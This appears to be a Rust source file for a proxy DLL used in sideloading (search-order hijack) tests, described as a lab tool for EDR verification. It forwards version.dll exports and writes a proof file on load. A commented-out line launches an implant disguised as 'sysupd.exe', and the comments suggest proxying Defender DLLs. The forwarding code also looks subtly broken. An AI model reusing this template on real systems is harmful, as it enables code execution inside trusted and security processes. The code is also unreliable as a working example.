//! Benign lab proxy DLL for sideloading tests (search-order hijack).
//!
//! Forwards the genuine DLL's exports to the real System32 copy and, on attach,
//! either writes a proof file (default) or spawns the implant (feature-gated
//! below). No network, no payload bytes - this exists purely to generate
//! sideload telemetry for EDR verification.

use windows_sys::Win32::Foundation::{FARPROC, HMODULE};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

static REAL_PATH: &[u8] = b"C:\\Windows\\System32\\version.dll\0";
// ^ change to the DLL you are proxying (version.dll / mpclient.dll / mpsvc.dll)

fn real() -> HMODULE {
    unsafe { LoadLibraryA(REAL_PATH.as_ptr()) }
}

macro_rules! fwd {
    ($name:literal) => {
        #[no_mangle]
        pub extern "system" fn $name() -> FARPROC {
            let name = concat!($name, "\0");
            unsafe { GetProcAddress(real(), name.as_ptr()) }
        }
    };
}

// Forwarders - extend to match `dumpbin /exports` of the genuine DLL:
fwd!(GetFileVersionInfoW);
fwd!(GetFileVersionInfoSizeW);
fwd!(VerQueryValueW);

#[no_mangle]
pub extern "system" fn DllMain(_h: isize, reason: u32, _: *const u8) -> i32 {
    if reason == 1 {
        // DLL_PROCESS_ATTACH
        // benign variant: proof file only
        let _ = std::fs::write(r"C:\Users\Public\sideload_proof.txt", b"proxy loaded");
        // full-chain variant (uncomment on the ATTACKER build only, lab network only):
        // let _ = std::process::Command::new(r"C:\Users\Public\sysupd.exe").spawn();
    }
    1
}
